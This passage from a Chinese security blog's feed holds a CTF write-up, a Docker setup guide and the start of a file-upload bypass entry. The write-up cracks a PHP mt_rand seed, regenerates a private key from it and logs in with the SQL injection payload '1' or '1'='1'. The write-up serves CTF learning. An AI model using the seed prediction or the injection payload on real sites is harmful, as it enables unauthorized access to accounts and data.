EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span><br>Version: <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span><br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0xfc000000</span> - <span class="hljs-number">0xffffffff</span>, speed <span class="hljs-number">42.9</span> Mseeds/s <br>Version: <span class="hljs-number">5.2</span><span class="hljs-number">.1</span>+<br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0x68000000</span> - <span class="hljs-number">0x69ffffff</span>, speed <span class="hljs-number">0.5</span> Mseeds/s <br>seed = <span class="hljs-number">0x69cf57fb</span> = <span class="hljs-number">1775196155</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br></code></pre></td></tr></table></figure><p>抓包发现PHP/5.6.40，所以种子值为 1775196155</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    mt_srand(<span class="hljs-number">1775196155</span>);<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>        <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>        <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>&#125;<br>public_key();<br><span class="hljs-keyword">echo</span> private_key();<br></code></pre></td></tr></table></figure><p>得到私钥<code>XuNhoueCDCGc</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /login.php<br><br>username=crispr&amp;password=<span class="hljs-number">1</span><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>&amp;Private_key=XuNhoueCDCGc&amp;login=%E7%<span class="hljs-number">99</span>%BB%E5%BD%<span class="hljs-number">95</span><br></code></pre></td></tr></table></figure><p>getflag<br><img src="https://img-blog.csdnimg.cn/f2c187533a3c4d29890f97949b110d11.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="img"><a href="https://blog.csdn.net/zss192/article/details/104327432"></a><a href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于mt_rand()的生成的随机数只跟seed和调用该函数的次数有关。举一个简单的例子来说明一下这个问题，假设使用mt_srand(1111111)进行了一次播种操作，接下来调用mt_rand()函数，第一次生成的数值为a,第二次生成的为b，第三次生成的为c。任何一个人拿</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="https://swhat.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Docker-练习</title>
    <link href="https://swhat.github.io/2021/07/05/Docker-%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83/"/>
    <id>https://swhat.github.io/2021/07/05/Docker-%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83/</id>
    <published>2021-07-05T07:26:42.000Z</published>
    <updated>2021-11-27T12:13:19.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装LAMP"><a href="#安装LAMP" class="headerlink" title="安装LAMP"></a>安装LAMP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#拉取镜像</span><br>docker pull tutum/lamp<br><span class="hljs-comment">#查看镜像</span><br>docker images<br><span class="hljs-comment">#启动容器并绑定端口</span><br>docker run -d -p 8080:80 -p 3306:3306 -v /var/www/app/:/var/www/html tutum/lamp<br><span class="hljs-comment">#查看运行的容器</span><br>docker ps<br>docker ps -a<br><span class="hljs-comment">#进入正在运行的容器</span><br>docker <span class="hljs-built_in">exec</span> -it <span class="hljs-string">&#x27;id/name&#x27;</span> /bin/bash  <br><span class="hljs-comment">#退出容器</span><br><span class="hljs-built_in">exit</span><br><span class="hljs-comment">#开启、重启、停止容器</span><br>docker start <span class="hljs-string">&#x27;id/name&#x27;</span><br>docker restart <span class="hljs-string">&#x27;id/name&#x27;</span><br>docker stop <span class="hljs-string">&#x27;id/name&#x27;</span><br></code></pre></td></tr></table></figure><p>1.查询镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker search lamp         </span><br>NAME                                    DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED<br>mattrayner/lamp                         A simple LAMP docker image running the prere…   285                  [OK]<br>linode/lamp                             LAMP on Ubuntu 14.04.1 LTS Container            181                  <br>tutum/lamp                              Out-of-the-box LAMP image (PHP+MySQL)           148                  <br></code></pre></td></tr></table></figure><p>2.拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull tutum/lamp<br></code></pre></td></tr></table></figure><p>3.启动守护式容器并端口映射和挂载目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker run --name=lamp -d -p 8080:80 -p 3306:3306 -v /var/www/app/lamp/:/var/www/html tutum/lamp</span><br><span class="hljs-comment">#8080 宿主机端口 80 docker端口</span><br><span class="hljs-comment">#/var/www/app/lamp/ 宿主机要挂载的目录</span><br><span class="hljs-comment">#/var/www/html docker上被挂载的位置</span><br></code></pre></td></tr></table></figure><p>4.访问端口</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1637584553218-99de99ef-7e8a-4b2c-b99d-1e95a10cf1b5.png" alt="img"></p><h2 id="安装LNMP"><a href="#安装LNMP" class="headerlink" title="安装LNMP"></a>安装LNMP</h2><p>1.查询镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker search lnmp</span><br>NAME                    DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED<br>2233466866/lnmp         https://hub.docker.com/r/2233466866/lnmp        119                  <br>winstonpro/lnmp         based on ubuntu 14.04                           27                   <br></code></pre></td></tr></table></figure><p>2.拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull winstonpro/lnmp<br></code></pre></td></tr></table></figure><p>3.启动守护式容器并端口映射和挂载目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment">#  docker run --name=lnmp -d -p 8000:80 -p 3000:3306 -v /var/www/app/lnmp/:/usr/share/nginx/html win</span><br></code></pre></td></tr></table></figure><p>4.访问</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1637585156516-88ad3c96-b21a-4c90-a5b9-673be8eef163.png" alt="img"></p><h2 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h2><p>1.查找tomcat镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker search tomcat</span><br>NAME                          DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED<br>tomcat                        Apache Tomcat is an open <span class="hljs-built_in">source</span> implementati…   3182      [OK]       <br>tomee                         Apache TomEE is an all-Apache Java EE certif…   93        [OK]       <br>dordoka/tomcat                Ubuntu 14.04, Oracle JDK 8 and Tomcat 8 base…   58                   [OK]<br>kubeguide/tomcat-app          Tomcat image <span class="hljs-keyword">for</span> Chapter 1                      31                   <br>consol/tomcat-7.0             Tomcat 7.0.57, 8080, <span class="hljs-string">&quot;admin/admin&quot;</span>              18                   [OK]<br></code></pre></td></tr></table></figure><p>2.拉取tomcat版本为7的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull tomcat:7<br></code></pre></td></tr></table></figure><p>3.启动Tomcat<br>可以先看一下容器是否已经启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker ps -a<br></code></pre></td></tr></table></figure><p>没找到，说明没启动，需要启动tomcat容器。</p><p>查看一下tomcat镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali]<br>└─<span class="hljs-comment"># docker images</span><br>REPOSITORY        TAG               IMAGE ID       CREATED         SIZE<br>tomcat            7                 9dfd74e6bc2f   4 months ago    533MB<br>winstonpro/lnmp   latest            129456ccb561   4 years ago     1.72GB<br>tutum/lamp        latest            3d49e175ec00   5 years ago     427MB<br></code></pre></td></tr></table></figure><p>启动Tomcat容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --name tomcat -d -p 9090:8080 9dfd74e6bc2f<br></code></pre></td></tr></table></figure><p>容器启动成功。</p><p>4.移动Tomcat自带的项目文件ROOT<br>进入容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker exec -it tomcat /bin/bash</span><br>root@068009bd1ab5:/usr/<span class="hljs-built_in">local</span>/tomcat<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>将webapps.dist目录文件下tomcat自带的项目文件ROOT移动到webapps目录文件下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@068009bd1ab5:/usr/<span class="hljs-built_in">local</span>/tomcat<span class="hljs-comment"># mv ./webapps.dist/ROOT webapps/</span><br>root@068009bd1ab5:/usr/<span class="hljs-built_in">local</span>/tomcat<span class="hljs-comment"># cd webapps</span><br>root@068009bd1ab5:/usr/<span class="hljs-built_in">local</span>/tomcat/webapps<span class="hljs-comment"># ls</span><br>ROOT<br></code></pre></td></tr></table></figure><p>5.访问<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1637585700415-58b89a2c-0dfb-4097-8323-eb4bf84b9f0d.png" alt="img"></p><h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><p>1.查找nginx镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker search nginx                                                                                                                                                                 130 ⨯</span><br>NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED<br>nginx                             Official build of Nginx.                        15839     [OK]       <br></code></pre></td></tr></table></figure><p>2.拉取nginx镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull nginx<br></code></pre></td></tr></table></figure><p>3.启动nginx容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker run --name nginx-test -p 8888:80 -d nginx </span><br>--name nginx-test：容器名称。<br>-p 8080:80： 端口进行映射，将本地 8080 端口映射到容器内部的 80 端口。<br>-d nginx： 设置容器在在后台一直运行。<br></code></pre></td></tr></table></figure><p>4.访问</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1637588455726-32edff88-f25a-46c5-86ac-18c6ee04766d.png" alt="img"></p><p>5.设置反向代理并测试<br>首先进入容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker exec -it nginx-test /bin/bash</span><br>root@e97987b1f84f:/<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>安装vim</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e97987b1f84f:/<span class="hljs-comment"># sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br>root@e97987b1f84f:/<span class="hljs-comment"># apt-get clean</span><br>root@e97987b1f84f:/<span class="hljs-comment"># apt-get update</span><br>root@e97987b1f84f:/<span class="hljs-comment"># apt-get install vim</span><br></code></pre></td></tr></table></figure><p>用vim打开nginx.conf配置文件，并添加以下选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/nginx/nginx.conf<br></code></pre></td></tr></table></figure><p>并添加以下选项</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1637588771690-3e4c6e97-bd48-44b6-ad39-94da2d774d13.png" alt="img"></p><p>打开/etc/nginx/conf.d/目录，发现.conf后缀的文件只有default.conf文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e97987b1f84f:/<span class="hljs-comment"># cd /etc/nginx/conf.d</span><br>root@e97987b1f84f:/etc/nginx/conf.d<span class="hljs-comment"># ls</span><br>default.conf<br></code></pre></td></tr></table></figure><p>打开default.conf文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/nginx/conf.d/default.conf<br></code></pre></td></tr></table></figure><p>配置反向代理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">server&#123;<br>listen    80;<br>server_name192.168.182.130:8888; <span class="hljs-comment">#nginx反向代理服务器IP地址或域名</span><br>location / &#123;<br>root/usr/<span class="hljs-built_in">log</span>/nginx/html;<br>indexindex.htmlindex.htm;<br>proxy_passhttp:192.168.182.130:9999; <span class="hljs-comment">#被代理的服务IP地址或域名</span><br>&#125;<br></code></pre></td></tr></table></figure><p>意思是：通过访问<a href="http://192.168.182.130:8888，其实访问到的是http://39.105.93.165:9090">http://192.168.182.130:8888，其实访问到的是http://39.105.93.165:9090</a></p><p>也可以使用docker内网地址进行反向代理配置，通过公网ip访问。<br>查看docker内网ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker inspect 容器名/id<br><br>└─<span class="hljs-comment"># docker inspect nginx</span><br></code></pre></td></tr></table></figure><p>保存退出，然后重启容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker restart nginx-test<br></code></pre></td></tr></table></figure><p>这样访问的nginx服务器<a href="http://192.168.182.130:8888，其实是访问到了的是服务地址为http://39.105.93.165:9090的tomcat服务，从而实现简单的反向代理。">http://192.168.182.130:8888，其实是访问到了的是服务地址为http://39.105.93.165:9090的tomcat服务，从而实现简单的反向代理。</a></p><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><p>1.查找MySQL镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker search mysql<br></code></pre></td></tr></table></figure><p>2.拉取MySQL版本5.7的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull mysql:5.7<br></code></pre></td></tr></table></figure><p>3.启动MySQL容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7<br></code></pre></td></tr></table></figure><p>测试一下mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># mysql -h 192.168.182.130 -P 3306 -u root -p123456                                                                                                          130 ⨯</span><br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 3<br>Server version: 5.7.36 MySQL Community Server (GPL)<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MySQL [(none)]&gt; <br></code></pre></td></tr></table></figure><p>连接成功，说明MySQL安装成功</p><p>5.目录映射<br>先停止并删除MySQL的docker容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker stop mysql </span><br><br>└─<span class="hljs-comment"># docker rm mysql</span><br></code></pre></td></tr></table></figure><p>使用-v选项对/etc/mysql、/var/log/mysql、/var/lib/mysql目录进行目录映射</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># docker run --name mysql_1 -p 3306:3306 \</span><br>-v /usr/<span class="hljs-built_in">local</span>/docker/mysql/conf:/etc/mysql \<br>-v /usr/<span class="hljs-built_in">local</span>/docker/mysql/logs:/var/<span class="hljs-built_in">log</span>/mysql \<br>-v /usr/<span class="hljs-built_in">local</span>/docker/mysql/data:/var/lib/mysql \<br>-e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 <br><br>d27d52283a0f8e419b3e9fb14a074c72ae42374e9127ced3e9aa3be31c84e596<br></code></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/qq_43625917/article/details/107051203">https://blog.csdn.net/qq_43625917/article/details/107051203</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装LAMP&quot;&gt;&lt;a href=&quot;#安装LAMP&quot; class=&quot;headerlink&quot; title=&quot;安装LAMP&quot;&gt;&lt;/a&gt;安装LAMP&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="Dcoker" scheme="https://swhat.github.io/tags/Dcoker/"/>
    
  </entry>
  
  <entry>
    <title>文件上传之二次渲染</title>
    <link href="https://swhat.github.io/2021/06/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/"/>
    <id>https://swhat.github.io/2021/06/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/</id>
    <published>2021-06-29T14:26:42.000Z</published>
    <updated>2021-11-27T12:27:46.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.basename(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    <span class="hljs-variable">$fileext</span>= substr(strrchr(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                imagejpeg(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @unlink(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = 